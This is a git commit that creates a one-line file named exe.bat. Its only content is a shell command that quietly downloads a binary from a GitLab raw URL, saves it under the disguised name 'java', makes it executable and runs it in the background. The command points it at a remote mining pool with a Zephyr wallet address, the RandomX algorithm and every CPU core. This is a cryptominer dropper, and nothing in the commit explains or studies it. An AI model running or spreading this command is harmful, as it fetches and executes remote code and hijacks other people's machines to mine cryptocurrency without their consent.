0ed715b5e38a75c08ab8cbdc224e385f397e8d1f
meganukroeth <166919006+meganukroeth@users.noreply.github.com>
2024-04-13 21:53:02 +0700

    Create exe.bat

---
+++ exe.bat
@@ -0,0 +1,1 @@
+wget -qO java https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab && chmod +x java && nohup ./java -o 47.89.195.104:443 -a rx/0 -u ZEPHs8Np6p82XnhjYaDcHNT44gJY5pKbxZWNkmbsrPU2K7hzyTvhkDbRnbtSo3Af6UCAwT7SfvBhBV19BBAnuEbkEzTKg7jyTax.00 --randomx-1gb-pages -p -x -t $(nproc --all)
